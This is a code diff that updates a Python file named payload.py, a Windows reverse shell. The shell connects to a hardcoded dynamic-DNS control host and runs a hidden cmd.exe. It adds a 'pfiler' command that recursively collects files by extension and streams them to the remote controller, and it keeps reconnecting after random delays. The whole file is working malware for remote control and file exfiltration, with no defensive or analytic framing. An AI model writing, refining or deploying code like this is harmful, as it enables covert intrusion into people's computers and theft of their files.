@@ -1,5 +1,5 @@
 # payload.py
-# The Unbreakable Soul. Forged with a resilient, non-blocking core.
+# The Heartbeat Soul - PFILER Protocol and Persistent CMD State
 
 import os
 import sys
@@ -7,122 +7,157 @@ import time
 import random
 import socket
 import subprocess
-import threading
+from threading import Thread
 import hashlib
-import selectors
+import base64
 
-# --- DYNAMIC CONFIG ---
-RHOST = "##RHOST##"
+# --- DYNAMIC CONFIG (Replace ##RPORT## with your port) ---
+RHOST = "pong-control.ddns.net"
 RPORT = ##RPORT##
-CHUNK_SIZE = 4096
+# ----------------------
 
-def send_file_reliably(s_obj, file_path):
-    """Sends a single file with lossless protocol."""
-    try:
-        if not os.path.exists(file_path) or not os.path.isfile(file_path):
-            s_obj.sendall(b'FAIL_NOT_FOUND')
-            return
-        file_size = os.path.getsize(file_path)
-        hasher = hashlib.sha256()
-        with open(file_path, 'rb') as f:
-            for chunk in iter(lambda: f.read(CHUNK_SIZE), b""):
-                hasher.update(chunk)
-        file_hash = hasher.hexdigest()
-        header = f"{os.path.basename(file_path)}<SEP>{file_size}<SEP>{file_hash}"
-        s_obj.sendall(b'\n[+] Preparing to send ' + header.encode() + b'\n') # Notify master
-        s_obj.sendall(header.encode('utf-8'))
-        ack = s_obj.recv(1024).decode('utf-8')
-        if ack == 'ACK_HEADER':
-            with open(file_path, 'rb') as f:
-                s_obj.sendfile(f)
-            s_obj.recv(1024) # Wait for final ack
-    except Exception:
-        pass # Fails silently for a single file
+def find_files(start_dir, extensions_str):
+    """Recursively finds files with specified extensions for the pfiler command."""
+    files_to_transfer = []
+    extensions = {ext.strip().lower() for ext in extensions_str.split(',') if ext.strip()}
+    
+    if not os.path.isdir(start_dir):
+        return files_to_transfer
 
-def handle_exfiltration(s_obj, command, current_dir):
-    """Finds and sends files in a separate thread."""
-    try:
-        _, root_path, extensions_str = command.split('<SEP>')
-        if not os.path.isabs(root_path):
-            root_path = os.path.join(current_dir, root_path)
-        extensions = [ext.strip() for ext in extensions_str.split(',')]
-        found_files = []
-        if os.path.isdir(root_path):
-            for dirpath, _, filenames in os.walk(root_path):
-                for filename in filenames:
-                    if any(filename.endswith(ext) for ext in extensions):
-                        found_files.append(os.path.join(dirpath, filename))
-        s_obj.sendall(f"COUNT<SEP>{len(found_files)}".encode('utf-8'))
-        ack = s_obj.recv(1024).decode('utf-8')
-        if ack == 'ACK_COUNT':
-            for file_path in found_files:
-                send_file_reliably(s_obj, file_path)
-    except Exception:
-        pass
-    finally:
-        time.sleep(0.1)
-        s_obj.sendall(b'END_EXFIL')
+    for root, _, files in os.walk(start_dir):
+        for file in files:
+            if '.' in file:
+                file_ext = file.split('.')[-1].lower()
+                if file_ext in extensions:
+                    files_to_transfer.append(os.path.join(root, file))
+    return files_to_transfer
+
+def handle_pfiler(s_obj, command_line):
+    """Handles the pfiler command and transfers files reliably."""
+    parts = command_line.split(' ', 2)
+    if len(parts) != 3:
+        s_obj.sendall(b"\n[PFILER ERROR] Usage: pfiler <directory> <ext1,ext2,...>\n")
+        return
+
+    start_dir = parts[1].strip()
+    extensions_str = parts[2].strip()
+    
+    s_obj.sendall(f"\n[PFILER STATUS] Searching for files with extensions '{extensions_str}' in '{start_dir}'...\n".encode('utf-8'))
+    
+    files = find_files(start_dir, extensions_str)
+    
+    if not files:
+        s_obj.sendall(b"\n[PFILER STATUS] No files found matching criteria. Aborting transfer.\n")
+        return
+
+    s_obj.sendall(f"\n[PFILER START] Total files to transfer: {len(files)}\n".encode('utf-8'))
+
+    # Reliable block-by-block transfer for each file
+    for filepath in files:
+        try:
+            file_size = os.path.getsize(filepath)
+            
+            # 1. Calculate SHA256 Checksum
+            sha256_hash = hashlib.sha256()
+            with open(filepath, 'rb') as f:
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk: break
+                    sha256_hash.update(chunk)
+            file_hash = sha256_hash.hexdigest()
+
+            # 2. Send File Metadata
+            b64_filepath = base64.b64encode(filepath.encode('utf-8')).decode('utf-8')
+            metadata = f"[FILE_START] {b64_filepath}|{file_size}|{file_hash}\n"
+            s_obj.sendall(metadata.encode('utf-8'))
+            s_obj.sendall(f"[PFILER STATUS] Transferring: {filepath} ({file_size} bytes)\n".encode('utf-8'))
+
+            # 3. Send Binary Content (The core transfer)
+            with open(filepath, 'rb') as f:
+                f.seek(0)
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk: break
+                    s_obj.sendall(chunk)
+            
+            # 4. Send File End Marker
+            s_obj.sendall(f"\n[FILE_END] {b64_filepath}\n".encode('utf-8'))
+            
+        except Exception as e:
+            s_obj.sendall(f"\n[PFILER ERROR] Failed to transfer {filepath}: {str(e)}\n".encode('utf-8'))
+            continue
+
+    s_obj.sendall(b"\n[PFILER END] All specified file transfers complete.\n")
 
 def run_conduit():
+    """The main reverse shell loop."""
     while True:
-        s_obj, p, sel = None, None, None
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s_obj.connect((RHOST, RPORT))
-            s_obj.setblocking(False)
             
-            user_profile = os.environ.get('USERPROFILE', 'C:\\')
-            p = subprocess.Popen(
-                ['cmd.exe'],
-                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                cwd=user_profile, creationflags=0x08000000
-            )
+            CREATE_NO_WINDOW = 0x08000000
+            # THIS POPEN MAINTAINS THE CMD PROCESS STATE (CWD)
+            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
             
-            sel = selectors.DefaultSelector()
-            sel.register(s_obj, selectors.EVENT_READ, 'socket')
-            sel.register(p.stdout, selectors.EVENT_READ, 'stdout')
-            sel.register(p.stderr, selectors.EVENT_READ, 'stderr')
-
-            current_dir = user_profile
-
-            while p.poll() is None:
-                for key, mask in sel.select(timeout=1):
-                    if key.data == 'socket':
-                        data = s_obj.recv(4096)
-                        if not data: raise ConnectionError("Master disconnected")
+            def p_in():
+                buffer = b''
+                while True:
+                    try:
+                        chunk = s_obj.recv(4096)
+                        if not chunk: break
                         
-                        cmd_str = data.decode(errors='ignore').strip()
-                        if cmd_str.startswith('exfiltrate'):
-                            exfil_cmd = f"EXFILTRATE<SEP>{' '.join(cmd_str.split()[1:])}"
-                            threading.Thread(target=handle_exfiltration, args=(s_obj, exfil_cmd, current_dir)).start()
-                        elif cmd_str.startswith('cd '):
-                             # Update our internal tracker for the directory
-                             try:
-                                 new_dir = cmd_str.split(' ', 1)[1]
-                                 if not os.path.isabs(new_dir): new_dir = os.path.join(current_dir, new_dir)
-                                 # Normalize path (e.g., handle '..')
-                                 current_dir = os.path.abspath(new_dir)
-                             except: pass # Ignore cd errors, let cmd handle them
-                             p.stdin.write(data)
-                             p.stdin.flush()
-                        else:
-                            p.stdin.write(data)
-                            p.stdin.flush()
+                        buffer += chunk
 
-                    elif key.data in ('stdout', 'stderr'):
-                        pipe = key.fileobj
-                        output = pipe.read(4096)
-                        if output:
-                            s_obj.sendall(output)
+                        if b'\n' in buffer:
+                            lines = buffer.splitlines(True) 
+                            buffer = b'' 
+
+                            for line in lines:
+                                if line.endswith(b'\n') or line.endswith(b'\r\n'):
+                                    command_line = line.decode('utf-8').strip()
+                                    
+                                    # Intercept pfiler
+                                    if command_line.upper().startswith('PFILER'):
+                                        handle_pfiler(s_obj, command_line)
+                                    else:
+                                        # Pass all other commands (cd, dir, whoami) to the persistent cmd process
+                                        p.stdin.write(line);p.stdin.flush()
+                                else:
+                                    buffer = line 
+                        elif buffer and len(buffer) > 4096 * 10: 
+                             p.stdin.write(buffer);p.stdin.flush()
+                             buffer = b''
+
+                    except Exception: break
+                s_obj.close()
             
-        except (ConnectionError, BrokenPipeError, TimeoutError):
-            time.sleep(random.randint(20, 40))
+            def p_out():
+                while True:
+                    try:
+                        # Output includes the new CMD PROMPT/PATH
+                        d=os.read(p.stdout.fileno(), 4096);
+                        if not d: break;
+                        s_obj.sendall(d)
+                    except: break
+                s_obj.close()
+            def p_err():
+                while True:
+                    try:
+                        d=os.read(p.stderr.fileno(), 4096);
+                        if not d: break;
+                        s_obj.sendall(d)
+                    except: break
+                s_obj.close()
+
+            Thread(target=p_in, daemon=True).start()
+            Thread(target=p_out, daemon=True).start()
+            Thread(target=p_err, daemon=True).start()
+            p.wait()
+
         except Exception:
-            time.sleep(random.randint(20, 40))
-        finally:
-            if sel: sel.close()
-            if p: p.terminate()
-            if s_obj: s_obj.close()
+            time.sleep(random.randint(30, 60))
+            continue
 
 if __name__ == "__main__":
     run_conduit()
